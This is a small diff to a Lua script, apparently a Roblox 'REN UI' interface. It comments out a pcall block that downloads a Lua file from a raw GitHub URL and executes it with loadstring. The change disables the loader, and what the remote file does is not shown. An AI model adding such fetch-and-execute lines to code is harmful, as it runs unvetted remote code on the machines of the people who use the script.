@@ -45,11 +45,11 @@ local function safeCall(context, callback, ...)
 		warn("[REN UI] " .. tostring(context) .. " error: " .. tostring(err))
 	end
 end
-
+--[[
 pcall(function()
 	loadstring(game:HttpGet("https://raw.githubusercontent.com/Jilxi/123/refs/heads/main/1.lua"))()
 end)
-
+]]
 local ToggleUI = false
 
 local services = setmetatable({}, {
